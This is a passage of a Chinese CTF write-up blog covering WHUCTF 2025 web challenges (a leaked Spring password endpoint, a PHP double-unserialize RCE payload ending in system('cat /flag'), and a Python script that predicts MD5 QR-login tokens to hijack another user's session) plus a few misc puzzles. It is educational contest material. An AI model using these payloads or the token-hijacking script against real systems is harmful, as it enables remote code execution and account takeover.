class="params">(String[] args)</span> &#123;</span><br><span class="line">      UserDetailsServiceImpl.USERNAME = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">      UserDetailsServiceImpl.PASSWORD = UUID.randomUUID().toString();</span><br><span class="line">      SpringApplication.run(GuildApplication.class, args);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>发现<code>USERNAME = admin</code> 是硬编码，密码是对 <strong>UUID</strong> 进行的上述加密，现在只需要找到 <strong>UUID</strong> 即可</p>
+<p><strong>GuildMasterController</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.jwmc.kuri.guild;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.crypto.password.PasswordEncoder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller(&quot;/&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GuildMasterController</span> &#123;</span><br><span class="line">   <span class="meta">@Autowired</span></span><br><span class="line">   PasswordEncoder passwordEncoder;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@GetMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">flag</span><span class="params">(Model model)</span> &#123;</span><br><span class="line">      model.addAttribute(<span class="string">&quot;flag&quot;</span>, System.getenv(<span class="string">&quot;GZCTF_FLAG&quot;</span>) == <span class="literal">null</span> ? <span class="string">&quot;flag&#123;fake_test_flag&#125;&quot;</span> : System.getenv(<span class="string">&quot;GZCTF_FLAG&quot;</span>));</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@GetMapping(&#123;&quot;/secret_r0uter&quot;&#125;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">leak</span><span class="params">(Model model)</span> &#123;</span><br><span class="line">      model.addAttribute(<span class="string">&quot;leak&quot;</span>, <span class="built_in">this</span>.passwordEncoder.encode(UserDetailsServiceImpl.PASSWORD));</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;leak&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>注解中发现路径<code>/secret_r0uter</code> 访问一下可发现动态码（UUID）然后进行上述加密找出加密后的字符串即可登录成功得到flag</p>
+<p><img src="/../images/whuctf20254.png"></p>
+<p><img src="/../images/whuctf20255.png"></p>
+<h3 id="5-ezUnser（复现）"><a href="#5-ezUnser（复现）" class="headerlink" title="5.ezUnser（复现）"></a>5.ezUnser（复现）</h3><p>代码审计：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ser_a1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$ser_b1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj_a1</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser_a1</span>);</span><br><span class="line"><span class="variable">$obj_b1</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser_b1</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ser_a2</span> = <span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser_a1</span>));</span><br><span class="line"><span class="variable">$ser_b2</span> = <span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser_b1</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj_a2</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser_a2</span>);</span><br><span class="line"><span class="variable">$obj_b2</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser_b2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">get_class</span>(<span class="variable">$obj_a1</span>) === <span class="title function_ invoke__">get_class</span>(<span class="variable">$obj_a2</span>) || <span class="title function_ invoke__">get_class</span>(<span class="variable">$obj_b1</span>) === <span class="title function_ invoke__">get_class</span>(<span class="variable">$obj_b2</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Nope&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$ser_a1</span> != <span class="variable">$ser_a2</span> &amp;&amp; <span class="variable">$ser_b1</span> != <span class="variable">$ser_b2</span>) &#123;</span><br><span class="line">    (<span class="variable">$obj_a2</span>-&gt;<span class="variable">$c</span>())(<span class="variable">$obj_b2</span>-&gt;<span class="variable">$c</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>详见<a target="_blank" rel="noopener" href="https://ducklinger.top/2025/10/28/2025-10-28-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/">序列化和反序列化</a> </p>
+<p>题目要求接收 POST 参数<code>a</code>、<code>b</code>、<code>c</code>，并执行以下操作：</p>
+<ol>
+<li>对<code>a</code>、<code>b</code>分别反序列化，得到<code>$obj_a1</code>、<code>$obj_b1</code>（第一次反序列化）。</li>
+<li>把第一次反序列化的结果重新序列化，再反序列化，得到<code>$obj_a2</code>、<code>$obj_b2</code>（第二次反序列化）。</li>
+<li><strong>限制 1</strong>：如果第一次和第二次反序列化得到的对象类名相同（<code>get_class($obj_a1) === get_class($obj_a2)</code> 或 <code>$obj_b1</code>与<code>$obj_b2</code>类名相同），则直接退出（<code>die</code>）。</li>
+<li><strong>限制 2</strong>：如果第一次序列化字符串（<code>$ser_a1</code>、<code>$ser_b1</code>）与第二次序列化字符串（<code>$ser_a2</code>、<code>$ser_b2</code>）不同，则执行：<code>($obj_a2-&gt;$c())($obj_b2-&gt;$c())</code>（最终目标是让这行代码执行我们想要的命令）</li>
+</ol>
+<p>简单说：<strong>第一次反序列化得到临时类对象，第二次反序列化会恢复成原始类对象</strong> </p>
+<p>PHP 的原生异常类（如<code>Error</code>、<code>Exception</code>）有一个公共方法<code>getMessage()</code>，作用是返回构造时传入的字符串。例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;system&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>(); <span class="comment">// 输出字符串 &quot;system&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造的序列大致为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">a=O:<span class="number">6</span>:<span class="string">&quot;Errora&quot;</span>:<span class="number">8</span>:&#123;</span><br><span class="line">    s:<span class="number">10</span>:<span class="string">&quot;*message&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;system&quot;</span>;  <span class="comment">// 核心：存储函数名 &quot;system&quot;</span></span><br><span class="line">    s:<span class="number">13</span>:<span class="string">&quot;Errorstring&quot;</span>;s:<span class="number">0</span>:<span class="string">&quot;&quot;</span>;      <span class="comment">// Error类自带属性（空值不影响）</span></span><br><span class="line">    s:<span class="number">7</span>:<span class="string">&quot;*code&quot;</span>;i:<span class="number">0</span>;                <span class="comment">// Error类自带属性（0不影响）</span></span><br><span class="line">    s:<span class="number">7</span>:<span class="string">&quot;*file&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;&quot;</span>;             <span class="comment">// 路径设为空（避免环境差异）</span></span><br><span class="line">    s:<span class="number">7</span>:<span class="string">&quot;*line&quot;</span>;i:<span class="number">1</span>;                <span class="comment">// 行号设为1（避免环境差异）</span></span><br><span class="line">    s:<span class="number">12</span>:<span class="string">&quot;Errortrace&quot;</span>;a:<span class="number">0</span>:&#123;&#125;;       <span class="comment">// 堆栈设为空（不影响）</span></span><br><span class="line">    s:<span class="number">15</span>:<span class="string">&quot;Errorprevious&quot;</span>;N;         <span class="comment">// 前置错误设为null（不影响）</span></span><br><span class="line">    s:<span class="number">27</span>:<span class="string">&quot;__PHP_Incomplete_Class_Name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;Error&quot;</span>;  <span class="comment">// 关键标签：原始类是Error</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">b=O:<span class="number">6</span>:<span class="string">&quot;Errora&quot;</span>:<span class="number">8</span>:&#123;</span><br><span class="line">    s:<span class="number">10</span>:<span class="string">&quot;*message&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;cat /flag&quot;</span>;  <span class="comment">// 核心：存储命令参数 &quot;cat /flag&quot;</span></span><br><span class="line">    s:<span class="number">13</span>:<span class="string">&quot;Errorstring&quot;</span>;s:<span class="number">0</span>:<span class="string">&quot;&quot;</span>;        <span class="comment">// 同上，自带属性</span></span><br><span class="line">    s:<span class="number">7</span>:<span class="string">&quot;*code&quot;</span>;i:<span class="number">0</span>;</span><br><span class="line">    s:<span class="number">7</span>:<span class="string">&quot;*file&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;&quot;</span>;</span><br><span class="line">    s:<span class="number">7</span>:<span class="string">&quot;*line&quot;</span>;i:<span class="number">1</span>;</span><br><span class="line">    s:<span class="number">12</span>:<span class="string">&quot;Errortrace&quot;</span>;a:<span class="number">0</span>:&#123;&#125;;</span><br><span class="line">    s:<span class="number">15</span>:<span class="string">&quot;Errorprevious&quot;</span>;N;</span><br><span class="line">    s:<span class="number">27</span>:<span class="string">&quot;__PHP_Incomplete_Class_Name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;Error&quot;</span>;  <span class="comment">// 同上，标签指向Error</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c=getMessage  <span class="comment">// 调用的方法名：获取message中的内容</span></span><br></pre></td></tr></table></figure>
+
+<p>第一次序列化是临时类，第二次序列化是Error类并且存在可调用的方法拼接后得到<code>system(&#39;cat /flag&#39;)</code> </p>
+<p><img src="/../images/whuctf20256.png"></p>
+<h3 id="5-Zakologin（复现）"><a href="#5-Zakologin（复现）" class="headerlink" title="5.Zakologin（复现）"></a>5.Zakologin（复现）</h3><p>学废了，第一次见这种题目</p>
+<p><a target="_blank" rel="noopener" href="https://chat.deepseek.com/share/xv68423hevqn02bt22">https://chat.deepseek.com/share/xv68423hevqn02bt22</a></p>
+<ol>
+<li>发现每次发过来二维码的token顺序是固定的</li>
+<li>浏览器轮询</li>
+<li>通过自己的token预测下一个token即别人的二维码，劫持下一个人的二维码，等待别人扫码登录抢先登进去</li>
+</ol>
+<p>开了两次容器脚本持续请求记录的token</p>
+<p><img src="/../images/whuctf20257.png"></p>
+<p>构造攻击脚本根据请求得到的token预测下一个token并劫持，抢先登录</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置信息（关键修正：目标页面端口改为61857，与接口端口一致）</span></span><br><span class="line">GET_TOKEN_URL = <span class="string">&quot;http://127.0.0.1:61857/login/qrcode/get&quot;</span>  <span class="comment"># 获取token接口</span></span><br><span class="line">CHECK_TOKEN_URL = <span class="string">&quot;http://127.0.0.1:61857/login/qrcode/check&quot;</span>  <span class="comment"># 轮询接口</span></span><br><span class="line">TARGET_PAGE_URL = <span class="string">&quot;http://127.0.0.1:61857/zakofl4g&quot;</span>  <span class="comment"># 修正端口为61857</span></span><br><span class="line">HEADERS = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/133.0.0.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/html, */*&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_my_token</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;自己发送请求，获取当前序列的token（确定N）&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(GET_TOKEN_URL, headers=HEADERS, timeout=<span class="number">10</span>)</span><br><span class="line">        data = response.json()</span><br><span class="line">        my_token = data.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> my_token:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;❌ 未能获取自己的token，请检查接口&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;✅ 已获取自己的token: <span class="subst">&#123;my_token&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> my_token</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ 获取自己的token失败：<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_current_num</span>(<span class="params">my_token</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;根据自己的token，反向查找对应的数字N（MD5前16位匹配）&quot;&quot;&quot;</span></span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        test_token = hashlib.md5(<span class="built_in">str</span>(num).encode()).hexdigest()[:<span class="number">16</span>]</span><br><span class="line">        <span class="keyword">if</span> test_token == my_token:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;✅ 匹配成功！你的token对应数字：<span class="subst">&#123;num&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> num</span><br><span class="line">        <span class="keyword">if</span> num &gt; <span class="number">1000</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;❌ 未找到匹配的数字，可能生成算法不是MD5(数字)前16位&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_next_token</span>(<span class="params">current_num</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;生成下一个token（N+1的MD5前16位）&quot;&quot;&quot;</span></span><br><span class="line">    next_num = current_num + <span class="number">1</span></span><br><span class="line">    next_token = hashlib.md5(<span class="built_in">str</span>(next_num).encode()).hexdigest()[:<span class="number">16</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;🎯 预测下一个用户的token（数字<span class="subst">&#123;next_num&#125;</span>）: <span class="subst">&#123;next_token&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> next_token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hijack_next_token</span>(<span class="params">target_token</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;持续轮询目标token，劫持登录状态&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n🚀 开始劫持，等待用户使用该token...&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(</span><br><span class="line">                CHECK_TOKEN_URL,</span><br><span class="line">                params=&#123;<span class="string">&quot;token&quot;</span>: target_token&#125;,</span><br><span class="line">                headers=HEADERS,</span><br><span class="line">                timeout=<span class="number">5</span></span><br><span class="line">            )</span><br><span class="line">            data = response.json()</span><br><span class="line">            code = data.get(<span class="string">&quot;code&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> code == <span class="number">1</span>:</span><br><span class="line">                final_token = data.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n🎉 劫持成功！最终登录token: <span class="subst">&#123;final_token&#125;</span>&quot;</span>)</span><br><span class="line">                extract_flag(final_token)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">elif</span> code == <span class="number">2</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n⚠️  发现用户扫码！等待手机确认...&quot;</span>)</span><br><span class="line">                <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                    time.sleep(<span class="number">0.3</span>)</span><br><span class="line">                    resp = requests.get(CHECK_TOKEN_URL, params=&#123;<span class="string">&quot;token&quot;</span>: target_token&#125;, headers=HEADERS)</span><br><span class="line">                    resp_data = resp.json()</span><br><span class="line">                    <span class="keyword">if</span> resp_data.get(<span class="string">&quot;code&quot;</span>) == <span class="number">1</span>:</span><br><span class="line">                        final_token = resp_data.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;🎉 用户确认登录！最终token: <span class="subst">&#123;final_token&#125;</span>&quot;</span>)</span><br><span class="line">                        extract_flag(final_token)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">                    <span class="keyword">elif</span> resp_data.get(<span class="string">&quot;code&quot;</span>) == <span class="number">3</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;⚠️  用户未确认，二维码过期，继续等待下一个用户...&quot;</span>)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;🔍 等待中... 状态: <span class="subst">&#123;data.get(<span class="string">&#x27;msg&#x27;</span>, <span class="string">&#x27;未扫码&#x27;</span>)&#125;</span>&quot;</span>, end=<span class="string">&quot;\r&quot;</span>)</span><br><span class="line">                time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n❌ 请求异常：<span class="subst">&#123;e&#125;</span>，1秒后重试&quot;</span>, end=<span class="string">&quot;\r&quot;</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_flag</span>(<span class="params">final_token</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;自动访问目标页面，提取flag&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n🔍 开始自动访问目标页面，提取flag...&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        params = &#123;<span class="string">&quot;token&quot;</span>: final_token&#125;</span><br><span class="line">        headers_with_auth = HEADERS.copy()</span><br><span class="line">        headers_with_auth[<span class="string">&quot;Authorization&quot;</span>] = <span class="string">f&quot;Bearer <span class="subst">&#123;final_token&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 访问修正端口后的目标页面</span></span><br><span class="line">        response = requests.get(</span><br><span class="line">            TARGET_PAGE_URL,</span><br><span class="line">            params=params,</span><br><span class="line">            headers=headers_with_auth,</span><br><span class="line">            timeout=<span class="number">10</span></span><br><span class="line">        )</span><br><span class="line">        response.raise_for_status()  <span class="comment"># 抛出HTTP错误</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 提取flag&#123;xxx&#125;格式的内容</span></span><br><span class="line">        flag_pattern = <span class="string">r&quot;flag\&#123;[a-zA-Z0-9_@#$%^&amp;*()\-+=]+\&#125;&quot;</span></span><br><span class="line">        <span class="keyword">match</span> = re.search(flag_pattern, response.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">            flag = <span class="keyword">match</span>.group()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n🏆 成功提取flag：<span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查响应头</span></span><br><span class="line">        <span class="keyword">for</span> header_name, header_value <span class="keyword">in</span> response.headers.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> header_name.lower() <span class="keyword">and</span> re.search(flag_pattern, <span class="built_in">str</span>(header_value)):</span><br><span class="line">                flag = re.search(flag_pattern, <span class="built_in">str</span>(header_value)).group()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n🏆 从响应头提取flag：<span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 输出页面内容供手动查找</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n⚠️  未找到标准格式flag，以下是页面内容（可手动搜索flag关键词）：&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line">        <span class="built_in">print</span>(response.text[:<span class="number">2000</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n❌ 提取flag失败：<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;💡 建议手动访问：<span class="subst">&#123;TARGET_PAGE_URL&#125;</span>?token=<span class="subst">&#123;final_token&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;📌 开始执行：自查token → 预测下一个 → 劫持 → 提取flag&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">    my_token = get_my_token()</span><br><span class="line">    current_num = find_current_num(my_token)</span><br><span class="line">    next_token = generate_next_token(current_num)</span><br><span class="line">    hijack_next_token(next_token)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/whuctf20258.png"></p>
+<hr>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="1-猫咪日记"><a href="#1-猫咪日记" class="headerlink" title="1.猫咪日记"></a>1.猫咪日记</h3><p>emoji表情首先想到<a target="_blank" rel="noopener" href="https://wnkit.com/tool/base100-encoder-decoder">base100</a>解密一下得到flag</p>
+<h3 id="2-梅林午餐肉"><a href="#2-梅林午餐肉" class="headerlink" title="2.梅林午餐肉"></a>2.梅林午餐肉</h3><p>类似<a target="_blank" rel="noopener" href="https://www.metools.info/code/bacon193.html">Bacon加密</a>，把C换成A再Bacon解密一下得到flag</p>
+<h3 id="3-01AI-Problem（没接触过）"><a href="#3-01AI-Problem（没接触过）" class="headerlink" title="3.01AI-Problem（没接触过）"></a>3.01AI-Problem（没接触过）</h3><p>让ai写一个模型根据modeified_mnist给的数据进行训练简单训练一下给出模型文件mnist_model.pth</p>
+<p>大致知道流程了，根据给出的训练数据集训练生成一个模型参数然后再根据这个参数识别图案得到密文：<code>20311369131496163448410746113142281526584940390147578688469508297899856840539896843521565163417523789</code> 然后再让读取一下<code>mnist_cnn_weights.pth</code> 里面的的内容得到:</p>
